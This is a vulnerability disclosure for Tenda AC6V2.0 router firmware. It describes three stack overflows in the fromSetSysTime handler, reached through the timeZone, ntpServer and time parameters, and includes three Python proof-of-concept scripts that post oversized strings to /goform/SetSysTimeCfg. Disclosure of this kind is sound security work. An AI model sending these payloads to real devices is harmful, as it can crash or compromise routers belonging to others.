# Tenda AC6V2.0_V15.03.06.23_multi firmware is vulnerable to Buffer Overflow via function "fromSetSysTime"

Firmware download website:

[AC6V2.0升级软件_腾达(Tenda)官方网站](https://www.tenda.com.cn/material/show/2855)

The function contains three separate stack overflow vulnerabilities:

1、**stack overflow** can occur by passing the **`timeZone`** parameter via a POST request, which is then processed by `sscanf` or `strcpy`.

![image-20250619010901848](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250619010901848.png)

2、**stack overflow** can occur by sending the **`ntpServer`** parameter through a POST request, which is subsequently handled by `strcpy`.

![image-20250619012519928](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250619012519928.png)

3、**stack overflow** can occur by supplying the **`time`** parameter via a POST request, leading to an overflow when processed by `sscanf`.

![image-20250619012612501](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250619012612501.png)

poc

```python
#first poc
import requests
def send_payload(url, payload):
    params={
            'timeType':b'sync',
            'timeZone':payload,}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x500
url="http://192.168.1.1/goform/SetSysTimeCfg"
send_payload(url, payload)

#second poc
import requests
def send_payload(url, payload):
    params={
            'timeType':b'sync',
            'ntpServer':payload}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x500
url="http://192.168.1.1/goform/SetSysTimeCfg"
send_payload(url, payload)  

#third poc
import requests
def send_payload(url, payload):
    params={
            'timeType':b'manual',
            'time':payload,}
    cookie={'password':'yectgb'}
    response = requests.post(url,cookies=cookie,data=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")

payload=b'a'*0x500
url="http://192.168.1.1/goform/SetSysTimeCfg"
send_payload(url, payload)
```

![image-20250619013006083](https://kingimg.oss-cn-hangzhou.aliyuncs.com/img/image-20250619013006083.png)